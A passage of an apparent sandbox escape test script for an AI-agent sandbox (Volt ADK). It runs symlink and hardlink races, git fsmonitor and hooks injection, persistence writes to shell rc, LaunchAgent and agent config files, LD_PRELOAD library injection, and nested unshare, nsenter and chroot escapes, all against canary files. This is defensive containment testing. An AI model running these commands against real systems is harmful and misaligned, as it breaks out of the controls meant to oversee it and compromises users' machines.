/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

// Round 10 escape probe: new escape classes against the real SandboxManager (Seatbelt on macOS,
// bubblewrap in the Linux rig), per sandbox profile. Every attempt is harmless if it succeeds: it
// targets canaries in a throwaway fixture (a fake HOME, a workspace, an "outside" folder), local
// listeners the probe starts itself, and a canary process it starts itself. No real secret is read.
//
//   node escapeProbe.mjs [--out file.json] [--only id,id] [--fixture dir] [--volt-out /path/to/out]
//
// Prints one row per attempt and arm: BLOCKED, THROUGH (an escape), or n/a. Exit code 1 when any
// attempt got through.

import { execFileSync, spawn } from 'node:child_process';
import { promises as fs, existsSync, readFileSync } from 'node:fs';
import dgram from 'node:dgram';
import net from 'node:net';
import os from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const arg = (name, fallback) => { const at = process.argv.indexOf(name); return at > 0 ? process.argv[at + 1] : fallback; };
const here = dirname(fileURLToPath(import.meta.url));
const OUT = arg('--volt-out', process.env.VOLT_OUT ?? join(here, '..', '..', '..', '..', '..', '..', 'out'));
globalThis._VSCODE_FILE_ROOT = OUT;
const load = path => import(pathToFileURL(join(OUT, path)).href);
const { SandboxManager } = await load('vs/platform/voltSandbox/node/sandboxManager.js');
const { agentSandboxPolicy } = await load('vs/platform/voltSandbox/common/sandboxPolicy.js');
const { builtinProfile } = await load('vs/platform/voltSandbox/common/sandboxProfiles.js');
const { sandboxHostFacts } = await load('vs/platform/voltSandbox/node/sandboxResolver.js');
const { composeSandboxPolicy } = await load('vs/platform/voltSandbox/common/sandboxComposition.js');
const { parseSandboxPolicyLayer } = await load('vs/platform/voltSandbox/common/sandboxSchema.js');

// The environment Volt's git extension starts git with, when this checkout has it (the fix for the planted bare repository).
const gitExtensionEnv = await (async () => {
	const helper = join(OUT, '..', 'extensions', 'git', 'out', 'safeGitEnv.js');
	if (process.argv.includes('--no-git-extension-env') || !existsSync(helper)) { return undefined; }
	const { createRequire } = await import('node:module');
	return createRequire(import.meta.url)(helper).withSafeBareRepository;
})();
const isMac = process.platform === 'darwin';
const isLinux = process.platform === 'linux';
const PERL = '/usr/bin/perl';
const only = arg('--only', '')?.split(',').filter(Boolean) ?? [];
const outFile = arg('--out', undefined);

// --- Fixture ------------------------------------------------------------------------------------
const fixtureParent = arg('--fixture', os.tmpdir());
await fs.mkdir(fixtureParent, { recursive: true });
const root = await fs.realpath(await fs.mkdtemp(join(fixtureParent, 'volt-r10-probe-')));
const home = join(root, 'home');
const ws = join(root, 'ws');
const outside = join(root, 'outside');
const runRoot = join(root, 'runs');
const agentTmp = join(root, 'agent-tmp');
const userData = join(home, 'Library', 'Application Support', 'Volt');
for (const dir of [home, ws, outside, runRoot, agentTmp, userData, join(home, '.ssh'), join(home, '.aws'), join(home, '.claude'), join(home, '.volt', 'sandbox-cache'), join(home, '.volt', 'sandbox', 'agent-state', 'other-chat'),
	join(home, '.docker', 'run'), join(home, '.cargo', 'bin'), join(home, 'Library', 'LaunchAgents'), join(home, '.config', 'fish'), join(home, '.local', 'bin'), join(outside, 'dir'), join(ws, 'sub'), join(ws, 'real')]) {
	await fs.mkdir(dir, { recursive: true });
}
await fs.writeFile(join(home, '.ssh', 'id_ed25519'), '-----BEGIN OPENSSH PRIVATE KEY-----\nCANARY-SSH\n');
await fs.writeFile(join(home, '.aws', 'credentials'), '[default]\naws_secret_access_key=CANARY-AWS\n');
await fs.writeFile(join(home, '.zshrc'), '# canary rc\n');
await fs.writeFile(join(home, '.claude', 'settings.json'), '{"model":"opus"}');
await fs.writeFile(join(home, '.claude.json'), '{"mcpServers":{}}');
await fs.writeFile(join(home, '.cargo', 'bin', 'cargo-canary'), 'TOOLCHAIN-OK\n');
await fs.writeFile(join(home, '.volt', 'sandbox', 'agent-state', 'other-chat', 'settings.json'), '{"other":"chat"}');
await fs.writeFile(join(userData, 'token'), 'CANARY-AGENT-SERVER-TOKEN');
await fs.writeFile(join(outside, 'secret.txt'), 'CANARY-OUTSIDE\n');
await fs.writeFile(join(outside, 'dir', 'secret.txt'), 'CANARY-OUTSIDE-DIR\n');
await fs.writeFile(join(ws, 'real', 'secret.txt'), 'inside\n');
await fs.writeFile(join(ws, 'readme.txt'), 'hello\n');
// A real git repository as the workspace (a commit, so host git commands have something to do).
const gitBin = (() => { try { return isMac ? join(execFileSync('git', ['--exec-path'], { encoding: 'utf8' }).trim(), 'git') : 'git'; } catch { return undefined; } })();
const hostGit = (args, cwd = ws) => execFileSync(gitBin, ['-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'core.hooksPath=/dev/null', ...args], { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], env: { PATH: process.env.PATH, HOME: home, GIT_CONFIG_NOSYSTEM: '1' } });
if (gitBin) {
	hostGit(['init', '-q', '-b', 'main']);
	hostGit(['add', 'readme.txt']);
	hostGit(['commit', '-q', '-m', 'init']);
}

// --- Canary services ----------------------------------------------------------------------------
const hits = { tcp4: 0, tcp6: 0, udp: 0, unixTmp: 0, unixWs: 0, unixDocker: 0, unixSsh: 0, unixOutside: 0, abstract: 0, upstream: 0 };
const servers = [];
const tcp = async (key, hostAddr) => {
	const server = net.createServer(socket => { hits[key]++; socket.on('error', () => { }); socket.end('HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok'); });
	const ok = await new Promise(resolve => { server.once('error', () => resolve(false)); server.listen(0, hostAddr, () => resolve(true)); });
	if (!ok) { return 0; }
	servers.push(server);
	return server.address().port;
};
const unix = async (key, path) => {
	const server = net.createServer(socket => { hits[key]++; socket.on('error', () => { }); socket.destroy(); });
	const ok = await new Promise(resolve => { server.once('error', () => resolve(false)); server.listen(path, () => resolve(true)); });
	if (ok) { servers.push(server); }
	return ok ? path : undefined;
};
const port4 = await tcp('tcp4', '127.0.0.1');
const port6 = await tcp('tcp6', '::1');
const upstreamPort = await tcp('upstream', '127.0.0.1');
const udpServer = dgram.createSocket('udp4');
udpServer.on('message', () => { hits.udp++; });
await new Promise(resolve => udpServer.bind(0, '127.0.0.1', resolve));
const udpPort = udpServer.address().port;
const sockTmp = await unix('unixTmp', join(agentTmp, 'c.sock'));
const sockWs = await unix('unixWs', join(ws, 'c.sock'));
const sockDocker = await unix('unixDocker', join(home, '.docker', 'run', 'docker.sock'));
const sockSsh = await unix('unixSsh', join(outside, 'ssh-agent.sock'));
const sockOutside = await unix('unixOutside', join(outside, 'c.sock'));
const abstractName = `volt-r10-abstract-${process.pid}`;
const sockAbstract = isLinux ? await unix('abstract', `\0${abstractName}`) : undefined;
// A canary process a debugger could attach to (not a platform binary: this node).
const canaryProc = spawn(process.execPath, ['-e', 'setInterval(() => {}, 1000)', `volt-r10-canary-proc-${process.pid}`], { stdio: 'ignore' });

// --- Managers and arms --------------------------------------------------------------------------
const facts = await sandboxHostFacts();
const host = { ...facts, home };
const manager = new SandboxManager(undefined, { runRoot, host });
// Every allowed connection of the "stub" manager lands on the upstream canary: no traffic leaves this machine.
const resolved = [];
const lookup = async name => {
	resolved.push(name);
	if (['registry.npmjs.org', 'api.anthropic.com', 'evil.example'].includes(name)) { return [{ address: '104.16.0.1', family: 4 }]; }
	throw new Error(`ENOTFOUND ${name}`);
};
const stubManager = new SandboxManager(undefined, { runRoot, host, proxy: { lookup, connect: () => net.connect(upstreamPort, '127.0.0.1') } });
const agentHost = { platform: process.platform, home, tempDirs: [agentTmp], userDataDir: userData, sshPrivateKeys: [join(home, '.ssh', 'id_ed25519')], cacheDir: join(home, '.volt', 'sandbox-cache') };
const agent = (network, extra = {}) => agentSandboxPolicy({ level: 'workspace-write', network, providerId: 'claude-code', workspaceRoots: [ws], ...extra }, agentHost);
const openProxy = () => {
	const parsed = parseSandboxPolicyLayer({ schemaVersion: 1, network: { mode: 'proxy', allow: ['*'] } });
	return composeSandboxPolicy(builtinProfile('workspace'), [{ source: 'user', trusted: true, layer: parsed.value }]).policy;
};
const ARMS = {
	workspace: { label: 'workspace profile (no network)', policy: () => builtinProfile('workspace') },
	'agent-off': { label: 'agent, network off', policy: () => agent(false) },
	'agent-on': { label: 'agent, network on', policy: () => agent(true), manager: stubManager },
	'proxy-any': { label: 'workspace profile, proxy allows *', policy: openProxy },
};
const hostEnv = {
	PATH: isMac ? `${dirname(process.execPath)}:/opt/homebrew/bin:/usr/bin:/bin:/usr/sbin:/sbin` : '/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin',
	HOME: home, LANG: 'C',
	GITHUB_TOKEN: 'CANARY-ENV-GH', AWS_SECRET_ACCESS_KEY: 'CANARY-ENV-AWS',
	NODE_OPTIONS: `--require ${ws}/CANARY-ENV-NODEOPT.js`, DYLD_INSERT_LIBRARIES: `${ws}/CANARY-ENV-DYLD.dylib`, LD_PRELOAD: `${ws}/CANARY-ENV-LDPRELOAD.so`,
	BASH_ENV: `${ws}/CANARY-ENV-BASHENV`, ENV: `${ws}/CANARY-ENV-ENV`, PERL5OPT: '-MCANARY_ENV_PERL', PYTHONSTARTUP: `${ws}/CANARY-ENV-PY`, RUBYOPT: '-rCANARY_ENV_RUBY',
	GIT_SSH_COMMAND: 'CANARY-ENV-GITSSH', GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: 'core.fsmonitor', GIT_CONFIG_VALUE_0: 'CANARY-ENV-GITCFG', GIT_ASKPASS: 'CANARY-ENV-ASKPASS', SSH_ASKPASS: 'CANARY-ENV-SSHASKPASS',
	GIT_EXEC_PATH: 'CANARY-ENV-GITEXEC', GIT_EXTERNAL_DIFF: 'CANARY-ENV-GITDIFF', GIT_PROXY_COMMAND: 'CANARY-ENV-GITPROXY', GIT_SSH: 'CANARY-ENV-GITSSHBIN', GIT_TEMPLATE_DIR: 'CANARY-ENV-GITTPL',
	SSH_AUTH_SOCK: sockSsh ?? '/nonexistent', VSCODE_IPC_HOOK_CLI: '/tmp/CANARY-ENV-IPC.sock', DOCKER_HOST: 'unix:///CANARY-ENV-DOCKER', HTTPS_PROXY: 'http://CANARY-ENV-PROXY.invalid:1',
	ELECTRON_RUN_AS_NODE: 'CANARY-ENV-ELECTRON', VOLT_AGENT_SERVER_TOKEN: 'CANARY-ENV-VOLT', npm_config_script_shell: 'CANARY-ENV-NPMSHELL', ZDOTDIR: `${ws}/CANARY-ENV-ZDOTDIR`,
};

async function run(armId, script, options = {}) {
	const arm = ARMS[armId];
	const result = await (arm.manager ?? manager).run({
		command: '/bin/sh',
		args: ['-c', `echo volt-ran; ${script}`],
		policy: options.policy ?? arm.policy(),
		context: { workspaceRoots: [ws], hostEnv, ...(options.env ? { env: options.env } : {}) },
	}, { timeoutMs: options.timeoutMs ?? 40_000 });
	return result;
}

const exists = path => fs.lstat(path).then(() => true, () => false);
const read = path => fs.readFile(path, 'utf8').catch(() => '');
const snapshotHits = () => ({ ...hits });
const hit = (before, key) => hits[key] > before[key];
const proxyConnect = targets => `for t in ${targets.map(t => `'${t}'`).join(' ')}; do ${PERL} -MIO::Socket::INET -MMIME::Base64 -e '($a,$h)=$ENV{HTTPS_PROXY}=~m{//([^@]+)@([^/]+)}; $s=IO::Socket::INET->new(PeerAddr=>$h, Timeout=>3) or do { print "CONNECT $ARGV[0] noproxy\\n"; exit 0 }; print $s "CONNECT $ARGV[0] HTTP/1.1\\r\\nHost: $ARGV[0]\\r\\nProxy-Authorization: Basic ".encode_base64($a,"")."\\r\\n\\r\\n"; $l=<$s>; $l=~s/\\r?\\n//; print "CONNECT $ARGV[0] $l\\n"' "$t"; done`;
/** Raw bytes to the run's proxy, optionally with its token; prints every status line that comes back. */
const proxyRaw = (label, payload, auth = true) => `${PERL} -MIO::Socket::INET -MMIME::Base64 -e '($a,$h)=$ENV{HTTPS_PROXY}=~m{//([^@]+)@([^/]+)}; $s=IO::Socket::INET->new(PeerAddr=>$h, Timeout=>3) or do { print "${label} noproxy\\n"; exit 0 }; $auth=${auth ? '"Proxy-Authorization: Basic ".encode_base64($a,"")."\\r\\n"' : '""'}; $p="${payload}"; $p=~s/AUTH\\r\\n/$auth/g; print $s $p; $SIG{ALRM}=sub{exit 0}; alarm 4; while(<$s>){ print "${label} $1\\n" if m{^HTTP/1\\.[01] (\\d+)} }'`;

// --- The attempts -------------------------------------------------------------------------------
// through(result, before) -> true when the escape worked. `arms` defaults to workspace, agent-off, agent-on.
const DEFAULT_ARMS = ['workspace', 'agent-off', 'agent-on'];
const persistTargets = [
	'.claude/settings.json', '.claude/hooks/pre.sh', '.claude/plugins/x/plugin.json', '.claude/skills/x/SKILL.md', '.claude/CLAUDE.md', '.claude.json',
	'.volt/hooks.json', '.volt/mcp.json', '.volt/settings/x.json', '.volt/customize/looks/x.json', '.volt/plugins/x/plugin.json', '.volt/skills/x/SKILL.md', '.volt/agents/x.md', '.volt/memory/x.md',
	'.volt/acp-node-cache/x.js', '.volt/claude-plugins/x/plugin.json', '.volt/sandbox.json', '.volt/trust/grants.json', '.volt/awake', '.volt/speech/helper', '.volt/sandbox/runs/planted',
	'.volt/sandbox/agent-state/other-chat/settings.json', '.volt/sandbox/agent-state/other-chat/hooks/x.sh',
	'.zshrc', '.zshenv', '.zprofile', '.zlogin', '.zlogout', '.bashrc', '.bash_profile', '.bash_logout', '.profile', '.inputrc', '.config/fish/config.fish', '.config/fish/conf.d/x.fish',
	'Library/LaunchAgents/com.volt.r10.canary.plist', '.config/systemd/user/x.service', '.config/autostart/x.desktop', '.local/bin/git', '.cargo/bin/cargo', '.npm/_npx/x/index.js',
	'.gitconfig', '.config/git/config', '.config/git/attributes', '.npmrc', '.yarnrc.yml', '.bunfig.toml', '.ssh/authorized_keys', '.ssh/config', '.ssh/rc', '.aws/config', '.docker/config.json', '.kube/config',
	'.cursor/mcp.json', '.cursor/hooks.json', '.codex/config.toml', '.gemini/settings.json', '.config/opencode/opencode.json', '.agents/skills/x/SKILL.md',
	'Library/Application Support/Volt/User/settings.json', 'Library/Application Support/Volt/User/keybindings.json', 'Library/Application Support/Code/User/settings.json', '.pam_environment', '.xprofile', '.tmux.conf', '.vimrc', '.config/nvim/init.lua',
];
// Workspace files something outside the sandbox runs or trusts later (Volt for other chats, git, hook managers).
const execLaterTargets = [
	'lefthook-local.yml', 'lefthook.yaml', '.lefthook.yaml', 'lefthook.toml', '.lefthook.toml', 'lefthook.json', '.lefthook.json', '.config/lefthook.yml', '.huskyrc', '.huskyrc.json', '.huskyrc.js', '.lintstagedrc', '.lintstagedrc.json',
	'.volt/skills/x/SKILL.md', '.volt/agents/x.md', '.volt/commands/x.md', '.volt/rules/x.md', '.volt/workflows/x.yaml', '.volt/flows/x.flow',
	'.agents/skills/x/SKILL.md', '.cursor/skills/x/SKILL.md', '.cursor/rules/x.mdc', '.cursor/commands/x.md', '.cursor/agents/x.md', '.cursor/cli.json', '.cursor/environment.json',
	'.codex/skills/x/SKILL.md', '.codex/agents/x.md', '.gemini/skills/x/SKILL.md', '.gemini/agents/x.md', '.gemini/GEMINI.md', '.claude/CLAUDE.md', '.claude/rules/x.md', '.claude/output-styles/x.md', '.claude/plugins/x/plugin.json',
	'.claude/workflows/x.md', 'CLAUDE.md', 'AGENTS.md', '.mise.toml', 'mise.toml', '.tool-versions', '.kimi/settings.json', '.pi/settings.json', '.grok/settings.json', '.fx/settings.json', '.muse/settings.json',
	'.git/rebase-merge/git-rebase-todo', '.git/sequencer/todo', '.git/info/exclude', '.git/info/attributes', '.git/hooks/pre-commit', '.git/config', '.git/config.worktree',
];
const appendAll = (base, targets) => targets.map(target => { const path = join(base, target); return `mkdir -p '${dirname(path)}' 2>/dev/null; printf 'VOLTPWN\\n' >> '${path}' 2>/dev/null`; }).join('; ') + '; true';
const planted = async (base, targets) => { const out = []; for (const target of targets) { if ((await read(join(base, target))).includes('VOLTPWN')) { out.push(target); } } return out; };
const unplant = async (base, targets) => {
	for (const target of targets) {
		const path = join(base, target);
		const text = await read(path);
		if (text === 'VOLTPWN\n') { await fs.rm(path, { force: true }); } else if (text.includes('VOLTPWN')) { await fs.writeFile(path, text.replace(/VOLTPWN\n/g, '')); }
	}
};

const ATTEMPTS = [
	// ---- symlink, hardlink and rename races out of the workspace ----
	{
		id: 'race-symlink-write', cls: 'symlink race', what: 'swap a workspace folder with a symlink to an outside folder 3000x while writing through it',
		sh: `cd ${ws}; (i=0; while [ $i -lt 3000 ]; do ln -sfn ${outside}/dir race 2>/dev/null; rm -f race 2>/dev/null; rm -rf race 2>/dev/null; mkdir race 2>/dev/null; rmdir race 2>/dev/null; i=$((i+1)); done) & (i=0; while [ $i -lt 3000 ]; do echo x > race/pwned 2>/dev/null; i=$((i+1)); done); wait; rm -rf race`,
		through: async () => (await fs.readdir(join(outside, 'dir'))).some(name => name !== 'secret.txt'),
		cleanup: async () => { for (const name of await fs.readdir(join(outside, 'dir'))) { if (name !== 'secret.txt') { await fs.rm(join(outside, 'dir', name), { recursive: true, force: true }); } } await fs.rm(join(ws, 'race'), { recursive: true, force: true }); },
	},
	{
		id: 'race-symlink-read', cls: 'symlink race', what: 'swap a readable workspace folder with a symlink to an outside folder 3000x while reading through it',
		sh: `cd ${ws}; (i=0; while [ $i -lt 3000 ]; do mv real real2 2>/dev/null; ln -sfn ${outside}/dir real 2>/dev/null; rm -f real 2>/dev/null; mv real2 real 2>/dev/null; i=$((i+1)); done) & (i=0; while [ $i -lt 3000 ]; do cat real/secret.txt 2>/dev/null; i=$((i+1)); done | sort -u); wait; [ -d real2 ] && { rm -f real; mv real2 real; }; true`,
		through: r => r.stdout.includes('CANARY-OUTSIDE'),
	},
	{
		id: 'race-rename-protected', cls: 'rename race', what: 'stage a folder, then rename it onto a protected name (.vscode, .husky, .claude/skills, .git/hooks)',
		sh: `cd ${ws}; for n in .vscode .husky .githooks; do mkdir -p stage-x && echo VOLTPWN > stage-x/tasks.json && mv stage-x "$n" 2>/dev/null; rm -rf stage-x; done; mkdir -p stage-h && echo VOLTPWN > stage-h/pre-commit && mv stage-h .git/hooks-new 2>/dev/null; mv .git/hooks .git/hooks-old 2>/dev/null && mv .git/hooks-new .git/hooks 2>/dev/null; rm -rf stage-h; true`,
		through: async () => (await Promise.all(['.vscode/tasks.json', '.husky/tasks.json', '.githooks/tasks.json', '.git/hooks/pre-commit'].map(p => read(join(ws, p))))).some(text => text.includes('VOLTPWN')),
		gap: () => isLinux ? 'filesystem.protectNew (bubblewrap guards only names that exist at launch; reported as unenforced)' : undefined,
		cleanup: async () => { for (const p of ['.vscode', '.husky', '.githooks', 'stage-x', 'stage-h', '.git/hooks-new']) { await fs.rm(join(ws, p), { recursive: true, force: true }); } if (await exists(join(ws, '.git', 'hooks-old'))) { await fs.rm(join(ws, '.git', 'hooks'), { recursive: true, force: true }); await fs.rename(join(ws, '.git', 'hooks-old'), join(ws, '.git', 'hooks')); } },
	},
	{
		id: 'race-hardlink', cls: 'hardlink race', what: 'hard-link files it may not write (rc file, toolchain, outside file, git config) into the workspace in a loop while they are renamed',
		sh: `cd ${ws}; i=0; while [ $i -lt 300 ]; do for t in ${home}/.zshrc ${home}/.cargo/bin/cargo-canary ${outside}/secret.txt ${ws}/.git/config ${home}/.claude/settings.json; do ln "$t" hl-$i 2>/dev/null && echo VOLTPWN >> hl-$i && echo LINKED; mv hl-$i hl-m 2>/dev/null; rm -f hl-m hl-$i; done; i=$((i+1)); done; true`,
		through: async r => r.stdout.includes('LINKED') || (await Promise.all([join(home, '.zshrc'), join(home, '.cargo/bin/cargo-canary'), join(outside, 'secret.txt'), join(ws, '.git/config'), join(home, '.claude/settings.json')].map(read))).some(text => text.includes('VOLTPWN')),
	},
	{
		id: 'dotdot-git-alias', cls: 'path alias', what: 'reach git config and hooks through a writable git folder (objects/../config, refs/../hooks, //, /./)',
		sh: `cd ${ws}; echo VOLTPWN >> .git/objects/../config 2>/dev/null; echo VOLTPWN >> .git/refs/../hooks/pre-commit 2>/dev/null; echo VOLTPWN >> .git//config 2>/dev/null; echo VOLTPWN >> .git/./hooks/pre-push 2>/dev/null; true`,
		through: async () => (await Promise.all(['.git/config', '.git/hooks/pre-commit', '.git/hooks/pre-push'].map(p => read(join(ws, p))))).some(text => text.includes('VOLTPWN')),
		cleanup: async () => { await fs.rm(join(ws, '.git/hooks/pre-commit'), { force: true }); await fs.rm(join(ws, '.git/hooks/pre-push'), { force: true }); },
	},
	// ---- git: hooks and config command keys that the host's git runs later ----
	{
		id: 'git-bare-repo-subfolder', cls: 'git config', what: 'plant a bare repository in a subfolder (HEAD, objects, refs, a config with core.worktree = . and core.fsmonitor); Volt\'s git extension then runs `git rev-parse` and `git status` in the folder of a file opened there',
		sh: `cd ${ws}; mkdir -p sub/pkg/objects sub/pkg/refs/heads sub/pkg/inner && echo 'ref: refs/heads/main' > sub/pkg/HEAD && printf '[core]\\n\\trepositoryformatversion = 0\\n\\tbare = false\\n\\tworktree = "."\\n\\tfsmonitor = "touch ${outside}/pwned-bare; false"\\n' > sub/pkg/config; echo x > sub/pkg/inner/readme.md; true`,
		through: async (_r, _before, ctx) => {
			if (!gitBin || !await exists(join(ws, 'sub/pkg/config'))) { return false; }
			// What the host does later, with the environment the git extension gives git (extensions/git/src/git.ts `spawn`).
			const base = { PATH: process.env.PATH, HOME: home, GIT_CONFIG_NOSYSTEM: '1', GIT_PAGER: 'cat' };
			const run = env => { for (const args of [['rev-parse', '--show-toplevel'], ['status', '--porcelain']]) { try { execFileSync(gitBin, args, { cwd: join(ws, 'sub', 'pkg', 'inner'), stdio: 'ignore', env }); } catch { /* git's own error */ } } };
			run(gitExtensionEnv ? gitExtensionEnv(base) : base);
			const extension = await exists(join(outside, 'pwned-bare'));
			// And a plain git, as the user's own terminal runs it (their git config decides: safe.bareRepository).
			run(base);
			ctx.plain = await exists(join(outside, 'pwned-bare'));
			return extension;
		},
		detail: (_r, _before, ctx) => `planted: yes; git extension env: ${gitExtensionEnv ? 'safe.bareRepository=explicit' : 'none (before the fix)'}; a plain git in that folder ${ctx.plain ? 'runs the command (the user\'s own terminal: their git config decides)' : 'does not run it'}`,
		cleanup: async () => { await fs.rm(join(ws, 'sub', 'pkg'), { recursive: true, force: true }); await fs.rm(join(outside, 'pwned-bare'), { force: true }); },
	},
	{
		id: 'git-config-keys', cls: 'git config', what: 'set core.fsmonitor / core.sshCommand / core.hooksPath / alias / include.path where the host git reads them (git config, config.lock rename, worktree config, GIT_CONFIG env files)',
		sh: `cd ${ws}; G="${gitBin}"; $G config core.fsmonitor "touch ${outside}/pwned-fsmonitor" 2>/dev/null; $G config core.sshCommand "touch ${outside}/pwned-ssh" 2>/dev/null; $G config core.hooksPath ${ws}/sub 2>/dev/null; $G config include.path ${ws}/sub/evil.cfg 2>/dev/null; $G config --worktree core.fsmonitor x 2>/dev/null; $G config --global core.fsmonitor "touch ${outside}/pwned-global" 2>/dev/null; printf '[core]\\n\\tfsmonitor = touch ${outside}/pwned-fsmonitor\\n' > .git/config.lock 2>/dev/null && mv .git/config.lock .git/config 2>/dev/null; rm -f .git/config.lock; true`,
		through: async () => {
			if (!gitBin) { return false; }
			try { execFileSync(gitBin, ['status', '--porcelain'], { cwd: ws, stdio: 'ignore', env: { PATH: process.env.PATH, HOME: home, GIT_CONFIG_NOSYSTEM: '1' } }); } catch { /* ignore */ }
			const config = await read(join(ws, '.git', 'config')) + await read(join(home, '.gitconfig')) + await read(join(ws, '.git', 'config.worktree'));
			return /fsmonitor|sshCommand|hooksPath|evil\.cfg/.test(config) || await exists(join(outside, 'pwned-fsmonitor')) || await exists(join(outside, 'pwned-global'));
		},
		cleanup: async () => { await fs.rm(join(ws, '.git', 'config.worktree'), { force: true }); await fs.rm(join(home, '.gitconfig'), { force: true }); },
	},
	{
		id: 'exec-later-workspace', cls: 'exec later', what: 'plant workspace files that a hook manager, git or Volt (for other, unsandboxed chats) runs or trusts later', arms: ['workspace', 'agent-off'],
		sh: appendAll(ws, execLaterTargets),
		through: async () => (await planted(ws, execLaterTargets)).length > 0,
		detail: async () => `planted: ${(await planted(ws, execLaterTargets)).join(', ') || 'none'}`,
		gap: () => isLinux ? 'filesystem.protectNew (none of these names existed at launch)' : undefined,
		cleanup: async () => { await unplant(ws, execLaterTargets); for (const dir of ['.volt', '.agents', '.cursor', '.codex', '.gemini', '.claude', '.config', '.kimi', '.pi', '.grok', '.fx', '.muse', '.git/rebase-merge', '.git/sequencer']) { await fs.rm(join(ws, dir), { recursive: true, force: true }); } },
		informational: true,
	},
	// ---- persistence: agent and tool config, shell startup files, launch agents ----
	{
		id: 'persist-home', cls: 'persistence', what: `write ${persistTargets.length} persistence locations in the home folder (~/.claude, ~/.volt, rc files, LaunchAgents, tool configs, PATH folders)`,
		sh: appendAll(home, persistTargets),
		through: async () => (await planted(home, persistTargets)).length > 0,
		detail: async () => `planted: ${(await planted(home, persistTargets)).join(', ') || 'none'}`,
		cleanup: () => unplant(home, persistTargets),
	},
	{
		id: 'persist-other-chat-state', cls: 'persistence', what: 'read or change another chat\'s agent-state overlay (its CLI settings and hooks)', arms: ['agent-off', 'agent-on'],
		sh: `cat ${home}/.volt/sandbox/agent-state/other-chat/settings.json; echo '{"hooks":"VOLTPWN"}' > ${home}/.volt/sandbox/agent-state/other-chat/settings.json; true`,
		through: async r => r.stdout.includes('"other"') || (await read(join(home, '.volt/sandbox/agent-state/other-chat/settings.json'))).includes('VOLTPWN'),
		cleanup: () => fs.writeFile(join(home, '.volt/sandbox/agent-state/other-chat/settings.json'), '{"other":"chat"}'),
	},
	// ---- environment injection ----
	{
		id: 'env-inherited-hooks', cls: 'env injection', what: 'loader, interpreter and git hooks in the host environment (NODE_OPTIONS, DYLD_*, LD_PRELOAD, BASH_ENV, PERL5OPT, GIT_SSH_COMMAND, GIT_CONFIG_*, proxies, IPC sockets) reach the sandboxed process',
		sh: 'env',
		through: r => /CANARY-ENV|CANARY_ENV/.test(r.stdout),
		detail: r => `leaked: ${[...new Set(r.stdout.split('\n').filter(line => /CANARY-ENV|CANARY_ENV/.test(line)).map(line => line.split('=')[0]))].join(', ') || 'none'}`,
	},
	{
		id: 'env-request-injection', cls: 'env injection', what: 'a launch request that sets DYLD_INSERT_LIBRARIES / LD_PRELOAD / NODE_OPTIONS / BASH_ENV: the launcher outside the sandbox must not load them',
		prepare: async () => {
			// A library whose constructor writes a marker outside the workspace: if anything outside the sandbox loads it, the marker appears.
			const source = join(ws, 'inject.c');
			await fs.writeFile(source, `#include <stdio.h>\n__attribute__((constructor)) static void pwn(void) { FILE *f = fopen("${outside}/pwned-preload", "a"); if (f) { fputs("x", f); fclose(f); } }\n`);
			try { execFileSync(isMac ? '/usr/bin/cc' : 'cc', [isMac ? '-dynamiclib' : '-shared', '-fPIC', '-o', join(ws, 'inject.lib'), source], { stdio: 'ignore' }); } catch { return 'no C compiler here: only the shell and node hooks are tried'; }
			return undefined;
		},
		env: () => ({ DYLD_INSERT_LIBRARIES: join(ws, 'inject.lib'), LD_PRELOAD: join(ws, 'inject.lib'), BASH_ENV: join(ws, 'inject.sh'), ENV: join(ws, 'inject.sh'), NODE_OPTIONS: `--require ${join(ws, 'inject.js')}` }),
		sh: `printf 'touch ${outside}/pwned-bashenv\\n' > ${ws}/inject.sh; /bin/sh -c true; /bin/bash -c true 2>/dev/null; true`,
		through: async () => await exists(join(outside, 'pwned-preload')) || await exists(join(outside, 'pwned-bashenv')),
		cleanup: async () => { for (const p of [join(outside, 'pwned-preload'), join(outside, 'pwned-bashenv'), join(ws, 'inject.c'), join(ws, 'inject.lib'), join(ws, 'inject.sh')]) { await fs.rm(p, { force: true }); } },
	},
	// ---- nested sandboxes ----
	{
		id: 'nested-sandbox-exec', cls: 'nested sandbox', platform: 'darwin', what: 'run sandbox-exec with an allow-all profile (and a second volt-sandbox-helper) inside the sandbox to shed the rules',
		sh: `/usr/bin/sandbox-exec -p '(version 1)(allow default)' /bin/cat ${outside}/secret.txt ${home}/.ssh/id_ed25519 2>&1; /usr/bin/sandbox-exec -p '(version 1)(allow default)' /bin/sh -c 'echo x > ${outside}/pwned-nested' 2>&1; /usr/bin/sandbox-exec -n no-network /bin/cat ${outside}/secret.txt 2>&1; true`,
		through: async r => r.stdout.includes('CANARY') || await exists(join(outside, 'pwned-nested')),
		cleanup: () => fs.rm(join(outside, 'pwned-nested'), { force: true }),
	},
	{
		id: 'nested-userns', cls: 'nested sandbox', platform: 'linux', what: 'a nested user and mount namespace (unshare, a second bwrap): remount protected binds read-write, unmount them, mount a fresh proc, chroot to /proc/1/root',
		sh: `cd ${ws}; unshare -Urm /bin/sh -c 'mount -o remount,rw,bind ${ws}/.git/config 2>/dev/null; echo VOLTPWN >> ${ws}/.git/config; umount ${ws}/.git/config 2>/dev/null; umount -l ${ws}/.git/hooks 2>/dev/null; echo VOLTPWN >> ${ws}/.git/config; echo VOLTPWN > ${ws}/.git/hooks/pre-commit; mount -t proc proc /proc 2>/dev/null; cat /proc/1/root${outside}/secret.txt; mount --bind / /mnt 2>/dev/null; cat /mnt${outside}/secret.txt' 2>/dev/null; unshare -Urn /bin/sh -c '${PERL} -MIO::Socket::INET -e "IO::Socket::INET->new(PeerAddr=>q(127.0.0.1:${port4}), Timeout=>2) and print qq(NET\\n)"' 2>/dev/null; bwrap --bind / / --dev-bind /dev /dev --proc /proc cat ${outside}/secret.txt ${home}/.ssh/id_ed25519 2>/dev/null; chroot /proc/1/root /bin/cat ${outside}/secret.txt 2>/dev/null; nsenter -t 1 -m -n /bin/cat ${outside}/secret.txt 2>/dev/null; true`,
